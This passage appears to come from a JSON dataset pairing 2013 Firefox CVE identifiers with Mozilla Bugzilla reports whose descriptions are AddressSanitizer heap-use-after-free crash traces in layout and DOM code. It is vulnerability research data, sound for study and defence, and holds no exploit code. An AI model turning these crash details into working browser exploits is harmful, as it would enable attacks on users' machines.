#14 0x7f8053c9ee3d in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) src/layout/generic/nsColumnSetFrame.cpp:671 > #15 0x7f8053ca46ff in nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsColumnSetFrame.cpp:941 > #16 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #17 0x7f8053e70018 in nsCanvasFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsCanvasFrame.cpp:487 > #18 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #19 0x7f8053de6161 in nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState*, bool, bool, nsHTMLReflowMetrics*, bool) src/layout/generic/nsGfxScrollFrame.cpp:430 > #20 0x7f8053de9df0 in nsHTMLScrollFrame::ReflowContents(ScrollReflowState*, nsHTMLReflowMetrics const&) src/layout/generic/nsGfxScrollFrame.cpp:530 > #21 0x7f8053dee2b3 in nsHTMLScrollFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsGfxScrollFrame.cpp:771 > #22 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #23 0x7f80541a0ebd in ViewportFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsViewportFrame.cpp:202 > #24 0x7f80539480b2 in PresShell::DoReflow(nsIFrame*, bool) src/layout/base/nsPresShell.cpp:7801 > #25 0x7f8053975911 in PresShell::ProcessReflowCommands(bool) src/layout/base/nsPresShell.cpp:7942 > #26 0x7f80539740cd in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) src/layout/base/nsPresShell.cpp:3932 > #27 0x7f8053972727 in PresShell::FlushPendingNotifications(mozFlushType) src/layout/base/nsPresShell.cpp:3778 > #28 0x7f805378449f in nsDocumentViewer::LoadComplete(tag_nsresult) src/layout/base/nsDocumentViewer.cpp:987 > #29 0x7f805b4c91dd in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, tag_nsresult) src/docshell/base/nsDocShell.cpp:6710 > #30 0x7f805b4c11db in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult) src/docshell/base/nsDocShell.cpp:6538 > #31 0x7f805b4c2109 in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult) src/docshell/base/nsDocShell.cpp:6545 > #32 0x7f805b5c4cdb in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, tag_nsresult) src/uriloader/base/nsDocLoader.cpp:1290 > #33 0x7f805b5c257c in nsDocLoader::doStopDocumentLoad(nsIRequest*, tag_nsresult) src/uriloader/base/nsDocLoader.cpp:870 > #34 0x7f805b5bb8a4 in nsDocLoader::DocLoaderIsEmpty(bool) src/uriloader/base/nsDocLoader.cpp:760 > #35 0x7f805b5bfb5b in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) src/uriloader/base/nsDocLoader.cpp:644 > #36 0x7f805b5c121a in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) src/uriloader/base/nsDocLoader.cpp:648 > #37 0x7f80519d4c03 in nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, tag_nsresult) src/netwerk/base/src/nsLoadGroup.cpp:676 > #38 0x7f80551f3ec5 in nsDocument::DoUnblockOnload() src/content/base/src/nsDocument.cpp:7881 > #39 0x7f80551f391b in nsDocument::UnblockOnload(bool) src/content/base/src/nsDocument.cpp:7809 > #40 0x7f805519499b in nsDocument::DispatchContentLoadedEvents() src/content/base/src/nsDocument.cpp:4443 > #41 0x7f8055297a1a in nsRunnableMethodImpl<void (nsDocument::*)(), true>::Run() src/../../../dist/include/nsThreadUtils.h:367 > #42 0x7f80611ff057 in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:627 > #43 0x7f8060eac572 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:238 > #44 0x7f805d9ca369 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 > #45 0x7f80614c54eb in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:216 > #46 0x7f80614c533e in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:209 > #47 0x7f80614c5229 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:183 > #48 0x7f805ce4ff4e in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 > #49 0x7f805ba8efa0 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:288 > #50 0x7f805176d11c in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3880 > #51 0x7f80517727c9 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3947 > #52 0x7f8051775285 in XRE_main src/toolkit/xre/nsAppRunner.cpp:4150 > #53 0x427f37 in do_main(int, char**, nsIFile*) src/browser/app/nsBrowserApp.cpp:228 > #54 0x4250f1 in main src/browser/app/nsBrowserApp.cpp:529 > #55 0x7f807264476c in > #56 0x424864 in >0x6004001e15b0 is located 0 bytes inside of 16-byte region [0x6004001e15b0,0x6004001e15c0) >freed by thread T0 here: > #0 0x4186d2 in __interceptor_free > #1 0x7f807366077e in moz_free src/memory/mozalloc/mozalloc.cpp:48 > #2 0x7f8053cc356d in TryRemoveFrame(nsIFrame*, mozilla::FramePropertyTable*, mozilla::FramePropertyDescriptor const*, nsIFrame*, bool (nsFrameList::*)(nsIFrame*)) src/../../dist/include/mozilla/mozalloc.h:225 > #3 0x7f8053cc2799 in nsContainerFrame::StealFrame(nsPresContext*, nsIFrame*, bool) src/layout/generic/nsContainerFrame.cpp:1259 > #4 0x7f8053c41d6f in nsBlockFrame::StealFrame(nsPresContext*, nsIFrame*, bool) src/layout/generic/nsBlockFrame.cpp:5616 > #5 0x7f8053cc4e4c in nsContainerFrame::DeleteNextInFlowChild(nsPresContext*, nsIFrame*, bool) src/layout/generic/nsContainerFrame.cpp:1408 > #6 0x7f8053c4390b in nsBlockFrame::DeleteNextInFlowChild(nsPresContext*, nsIFrame*, bool) src/layout/generic/nsBlockFrame.cpp:5701 > #7 0x7f8053c6210a in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) src/layout/generic/nsBlockReflowContext.cpp:305 > #8 0x7f8053c0aba2 in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:3090 > #9 0x7f8053c004b7 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:2501 > #10 0x7f8053be9ce6 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) src/layout/generic/nsBlockFrame.cpp:2023 > #11 0x7f8053bdd3fa in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1067 > #12 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #13 0x7f8053c9ee3d in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) src/layout/generic/nsColumnSetFrame.cpp:671 > #14 0x7f8053ca613f in nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsColumnSetFrame.cpp:1045 > #15 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #16 0x7f8053cbe4da in nsContainerFrame::ReflowOverflowContainerChildren(nsPresContext*, nsHTMLReflowState const&, nsOverflowAreas&, unsigned int, unsigned int&) src/layout/generic/nsContainerFrame.cpp:1148 > #17 0x7f8053bdced2 in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1042 > #18 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #19 0x7f8053c9ee3d in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) src/layout/generic/nsColumnSetFrame.cpp:671 > #20 0x7f8053ca46ff in nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsColumnSetFrame.cpp:941 > #21 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #22 0x7f8053e70018 in nsCanvasFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsCanvasFrame.cpp:487 > #23 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #24 0x7f8053de6161 in nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState*, bool, bool, nsHTMLReflowMetrics*, bool) src/layout/generic/nsGfxScrollFrame.cpp:430 > #25 0x7f8053de9df0 in nsHTMLScrollFrame::ReflowContents(ScrollReflowState*, nsHTMLReflowMetrics const&) src/layout/generic/nsGfxScrollFrame.cpp:530 > #26 0x7f8053dee2b3 in nsHTMLScrollFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsGfxScrollFrame.cpp:771 > #27 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #28 0x7f80541a0ebd in ViewportFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsViewportFrame.cpp:202 > #29 0x7f80539480b2 in PresShell::DoReflow(nsIFrame*, bool) src/layout/base/nsPresShell.cpp:7801 >previously allocated by thread T0 here: > #0 0x4187b2 in __interceptor_malloc > #1 0x7f80736608c5 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 > #2 0x7f8053cc0ae6 in nsOverflowContinuationTracker::Insert(nsIFrame*, unsigned int&) src/../../dist/include/mozilla/mozalloc.h:201 > #3 0x7f8053cbf46e in nsContainerFrame::ReflowOverflowContainerChildren(nsPresContext*, nsHTMLReflowState const&, nsOverflowAreas&, unsigned int, unsigned int&) src/layout/generic/nsContainerFrame.cpp:1185 > #4 0x7f8053bdced2 in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1042 > #5 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #6 0x7f8053c9ee3d in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) src/layout/generic/nsColumnSetFrame.cpp:671 > #7 0x7f8053ca46ff in nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsColumnSetFrame.cpp:941 > #8 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #9 0x7f8053cbe4da in nsContainerFrame::ReflowOverflowContainerChildren(nsPresContext*, nsHTMLReflowState const&, nsOverflowAreas&, unsigned int, unsigned int&) src/layout/generic/nsContainerFrame.cpp:1148 > #10 0x7f8053bdced2 in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1042 > #11 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #12 0x7f8053c9ee3d in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) src/layout/generic/nsColumnSetFrame.cpp:671 > #13 0x7f8053ca613f in nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsColumnSetFrame.cpp:1045 > #14 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #15 0x7f8053e70018 in nsCanvasFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsCanvasFrame.cpp:487 > #16 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #17 0x7f8053de6161 in nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState*, bool, bool, nsHTMLReflowMetrics*, bool) src/layout/generic/nsGfxScrollFrame.cpp:430 > #18 0x7f8053de9df0 in nsHTMLScrollFrame::ReflowContents(ScrollReflowState*, nsHTMLReflowMetrics const&) src/layout/generic/nsGfxScrollFrame.cpp:530 > #19 0x7f8053dee2b3 in nsHTMLScrollFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsGfxScrollFrame.cpp:771 > #20 0x7f8053cbb198 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:968 > #21 0x7f80541a0ebd in ViewportFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsViewportFrame.cpp:202 > #22 0x7f80539480b2 in PresShell::DoReflow(nsIFrame*, bool) src/layout/base/nsPresShell.cpp:7801 > #23 0x7f8053975911 in PresShell::ProcessReflowCommands(bool) src/layout/base/nsPresShell.cpp:7942 > #24 0x7f80539740cd in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) src/layout/base/nsPresShell.cpp:3932 > #25 0x7f8053972727 in PresShell::FlushPendingNotifications(mozFlushType) src/layout/base/nsPresShell.cpp:3778 > #26 0x7f80551df86e in nsDocument::FlushPendingNotifications(mozFlushType) src/content/base/src/nsDocument.cpp:6986 > #27 0x7f80553978f8 in mozilla::dom::Element::GetPrimaryFrame(mozFlushType) src/content/base/src/Element.cpp:1626 > #28 0x7f8055397507 in mozilla::dom::Element::GetStyledFrame() src/content/base/src/Element.cpp:486 > #29 0x7f805624e20f in nsGenericHTMLElement::GetOffsetRect(nsRect&) src/content/html/content/src/nsGenericHTMLElement.cpp:397 >Shadow bytes around the buggy address: > 0x0c0100034260: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd > 0x0c0100034270: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd > 0x0c0100034280: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd > 0x0c0100034290: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd > 0x0c01000342a0: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd >=>0x0c01000342b0: fa fa fd fd fa fa[fd]fd fa fa fd fd fa fa fd fd > 0x0c01000342c0: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd > 0x0c01000342d0: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd > 0x0c01000342e0: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd > 0x0c01000342f0: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd > 0x0c0100034300: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd >Shadow byte legend (one shadow byte represents 8 application bytes): > Addressable: 00 > Partially addressable: 01 02 03 04 05 06 07 > Heap left redzone: fa > Heap righ redzone: fb > Freed Heap region: fd > Stack left redzone: f1 > Stack mid redzone: f2 > Stack right redzone: f3 > Stack partial redzone: f4 > Stack after return: f5 > Stack use after scope: f8 > Global redzone: f9 > Global init order: f6 > Poisoned by user: f7 > ASan internal: fe >==16813== ABORTING > >"
      }
    ],
    "CVE-2013-1681": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=851781",
        "title": "Heap-use-after-free in nsContentUtils::RemoveScriptBlocker",
        "description": "==18530== ERROR: AddressSanitizer: heap-use-after-free on address 0x601401063130 at pc 0x7fbd90d3aeb9 bp 0x7fffb2289fd0 sp 0x7fffb2289fc8 READ of size 8 at 0x601401063130 thread T0 #0 0x7fbd90d3aeb8 in nsTArray_Impl<nsCOMPtr<nsIRunnable>, nsTArrayInfallibleAllocator>::RemoveElementsAt(unsigned int, unsigned int) ../../../dist/include/nsCOMPtr.h:409 #1 0x7fbd90db4b42 in nsDocument::EndUpdate(unsigned int) content/base/src/nsDocument.cpp:4211 #2 0x7fbd914a8ce8 in nsHTMLDocument::EndUpdate(unsigned int) content/html/document/src/nsHTMLDocument.cpp:2535 #3 0x7fbd90d37177 in nsContentUtils::SetNodeTextContent(nsIContent*, nsAString_internal const&, bool) content/base/src/mozAutoDocUpdate.h:38 #4 0x7fbd90f5ae6a in mozilla::dom::FragmentOrElement::SetTextContentInternal(nsAString_internal const&, mozilla::ErrorResult&) content/base/src/FragmentOrElement.cpp:938 #5 0x7fbd933e1f91 in mozilla::dom::NodeBinding::set_textContent(JSContext*, JS::Handle<JSObject*>, nsINode*, JS::Value*) ../../dist/include/nsINode.h:1088 #6 0x7fbd933e08e8 in mozilla::dom::NodeBinding::genericSetter(JSContext*, unsigned int, JS::Value*) objdir-ff-asan/dom/bindings/NodeBinding.cpp:1501 #7 0x7fbd94b50e33 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jscntxtinlines.h:327 #8 0x7fbd94b51db0 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) js/src/jsinterp.h:135 #9 0x7fbd94b528e1 in js::InvokeGetterOrSetter(JSContext*, JSObject*, JS::Value const&, unsigned int, JS::Value*, JS::Value*) js/src/jsinterp.cpp:503 #10 0x7fbd94baac61 in js::Shape::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, bool, JS::MutableHandle<JS::Value>) js/src/vm/Shape-inl.h:309 #11 0x7fbd94bb2ad1 in js::baseops::SetPropertyHelper(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<long>, unsigned int, JS::MutableHandle<JS::Value>, int) js/src/jsobj.cpp:4114 #12 0x7fbd94b58923 in js::SetPropertyOperation(JSContext*, unsigned char*, JS::Handle<JS::Value>, JS::Handle<JS::Value>) js/src/jsobjinlines.h:89 #13 0x7fbd94b3b04b in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) js/src/jsinterp.cpp:2252 #14 0x7fbd94b320d2 in js::RunScript(JSContext*, js::StackFrame*) js/src/jsinterp.cpp:340 #15 0x7fbd94b52f3d in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::AbstractFramePtr, JS::Value*) js/src/jsinterp.cpp:530 #16 0x7fbd94b533a8 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) js/src/jsinterp.cpp:569 #17 0x7fbd94a0b5b3 in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) js/src/jsapi.cpp:5528 #18 0x7fbd91692e68 in nsJSContext::EvaluateString(nsAString_internal const&, JSObject&, JS::CompileOptions&, bool, JS::Value*) dom/base/nsJSEnvironment.cpp:1290 #19 0x7fbd9171b8cb in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) dom/base/nsGlobalWindow.cpp:9957 #20 0x7fbd91704024 in nsGlobalWindow::RunTimeout(nsTimeout*) dom/base/nsGlobalWindow.cpp:10209 #21 0x7fbd9171ab78 in nsGlobalWindow::TimerCallback(nsITimer*, void*) dom/base/nsGlobalWindow.cpp:10478 #22 0x7fbd937df6ac in nsTimerImpl::Fire() xpcom/threads/nsTimerImpl.cpp:496 #23 0x7fbd937dfd20 in nsTimerEvent::Run() xpcom/threads/nsTimerImpl.cpp:587 #24 0x7fbd937d56d3 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:627 #25 0x7fbd9371c610 in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan/xpcom/build/nsThreadUtils.cpp:238 #26 0x7fbd92e6bc3c in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #27 0x7fbd9385ab49 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:216 #28 0x7fbd92b8b1cc in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #29 0x7fbd9266dd1a in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:288 #30 0x7fbd8fdfb405 in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3880 #31 0x7fbd8fdfc236 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3947 #32 0x7fbd8fdfd0d9 in XRE_main toolkit/xre/nsAppRunner.cpp:4150 #33 0x425556 in main browser/app/nsBrowserApp.cpp:228 #34 0x7fbd985fe76c in #35 0x424864 in 0x601401063130 is located 16 bytes inside of 32-byte region [0x601401063120,0x601401063140) freed by thread T0 here: #0 0x4188f7 in __interceptor_realloc #1 0x7fbd9963e4ae in moz_xrealloc memory/mozalloc/mozalloc.cpp:86 previously allocated by thread T0 here: #0 0x4188f7 in __interceptor_realloc #1 0x7fbd9963e4ae in moz_xrealloc memory/mozalloc/mozalloc.cpp:86 Shadow bytes around the buggy address: 0x0c03002045d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c03002045e0: fa fa fa fa fa fa fa fa 00 00 00 fa fa fa fa fa 0x0c03002045f0: fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fa 0x0c0300204600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0300204610: 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c0300204620: fa fa fa fa fd fd[fd]fd fa fa fa fa fa fa fa fa 0x0c0300204630: fa fa fa fa fa fa fa fa 00 00 04 fa fa fa fa fa 0x0c0300204640: fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd 0x0c0300204650: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0300204660: fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0300204670: fa fa fa fa fd fd fd fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap righ redzone: fb Freed Heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 ASan internal: fe ==18530== ABORTING"
      }
    ],
    "CVE-2013-1684": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=865537",
        "title": "Heap-use-after-free in mozilla::dom::HTMLMediaElement::LookupMediaElementURITable",
        "description": "Needs fuzzPriv extension to force gc. Let the testcase reload a couple of times and you should see a crash. ==29697== ERROR: AddressSanitizer: heap-use-after-free on address 0x6048007cc018 at pc 0x7f37966c651e bp 0x7fff45e783b0 sp 0x7fff45e783a8 READ of size 8 at 0x6048007cc018 thread T0 #0 0x7f37966c651d in nsCOMPtr<nsINodeInfo>::get() const objdir-ff-asan-sym/media/webrtc/signaling/signaling_ecc/../../../../dist/include/nsCOMPtr.h:782 #1 0x7f37966c618e in nsCOMPtr<nsINodeInfo>::operator->() const objdir-ff-asan-sym/media/webrtc/signaling/signaling_ecc/../../../../dist/include/nsCOMPtr.h:802 #2 0x7f37966b2b78 in nsINode::NodePrincipal() const objdir-ff-asan-sym/media/webrtc/signaling/signaling_ecc/../../../../dist/include/nsINode.h:744 #3 0x7f379a06126c in mozilla::dom::HTMLMediaElement::LookupMediaElementURITable(nsIURI*) content/html/content/src/HTMLMediaElement.cpp:1863 #4 0x7f379a05a23e in mozilla::dom::HTMLMediaElement::LoadResource() content/html/content/src/HTMLMediaElement.cpp:1073 #5 0x7f379a054443 in mozilla::dom::HTMLMediaElement::LoadFromSourceChildren() content/html/content/src/HTMLMediaElement.cpp:926 #6 0x7f379a0add22 in mozilla::dom::nsSyncSection::Run() content/html/content/src/HTMLMediaElement.cpp:672 #7 0x7f379fd84000 in nsBaseAppShell::RunSyncSectionsInternal(bool, unsigned int) widget/xpwidgets/nsBaseAppShell.cpp:352 #8 0x7f379fd7feca in nsBaseAppShell::RunSyncSections(bool, unsigned int) widget/xpwidgets/nsBaseAppShell.h:89 #9 0x7f379fd8576d in nsBaseAppShell::AfterProcessNextEvent(nsIThreadInternal*, unsigned int) widget/xpwidgets/nsBaseAppShell.cpp:408 #10 0x7f379fd859f1 in non-virtual thunk to nsBaseAppShell::AfterProcessNextEvent(nsIThreadInternal*, unsigned int) widget/xpwidgets/nsBaseAppShell.cpp:410 #11 0x7f37a4062218 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:640 #12 0x7f37a3d0c532 in NS_ProcessNextEvent(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:238 #13 0x7f37a096c8a9 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #14 0x7f37a4378d1b in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:219 #15 0x7f37a4378b6e in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:212 #16 0x7f37a4378a59 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:186 #17 0x7f379fd801ae in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #18 0x7f379ea6da40 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:289 #19 0x7f3794aadaeb in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3878 #20 0x7f3794ab31b0 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3945 #21 0x7f3794ab5e75 in XRE_main toolkit/xre/nsAppRunner.cpp:4146 #22 0x427c57 in do_main(int, char**, nsIFile*) browser/app/nsBrowserApp.cpp:271 #23 0x424e11 in main 